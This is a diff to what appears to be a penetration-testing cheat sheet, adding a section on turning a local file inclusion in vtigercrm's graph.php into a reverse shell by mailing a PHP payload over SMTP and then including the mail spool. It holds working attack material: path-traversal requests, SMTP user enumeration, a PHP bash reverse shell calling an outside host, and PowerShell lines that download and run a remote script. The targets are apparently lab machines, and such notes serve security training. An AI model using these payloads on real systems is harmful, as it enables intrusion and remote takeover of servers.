@@ -780,6 +780,51 @@ powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.
 c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')
 ```
 
+## LFI + SMPT Reverse Shell
+* assume you have local file inclusion like:
+```
+GET //vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action HTTP/1.1
+```
+* additionally assume SMTP Port (25) is open
+```
+# connect
+$> telnet 10.10.10.7 25
+Trying 10.10.10.7...
+Connected to 10.10.10.7.
+Escape character is '^]'.
+
+# wait for prompt
+220 beep.localdomain ESMTP Postfix
+
+# if enhanced
+EHLO asdf
+
+# if not
+HELO asdf
+
+# verify receipient
+VRFY fanis@localhost
+252 2.0.0 fanis@localhost # if exist
+550 5.1.1 <asdf>: Recipient address rejected: User unknown in local recipient table # if not
+
+# send mail with payload
+mail from: manu@manu.ch
+250 2.1.0 Ok
+rcpt to: fanis@localhost
+250 2.1.5 Ok
+data
+354 End data with <CR><LF>.<CR><LF>
+<?php system("/bin/bash -i >& /dev/tcp/10.10.14.4/3141 0>&1"); ?>
+
+.
+250 2.0.0 Ok: queued as E2517D92FD
+
+```
+* setup listener and send request to:
+```
+/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/fanis%00&module=Accounts&action
+```
+
 # RSA
 ## Given: q, p, and e values for an RSA key, along with an encrypted message
 The following script can be found [here](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e). It is using the extended eucledian algorithm for calculating the modulus inverse.
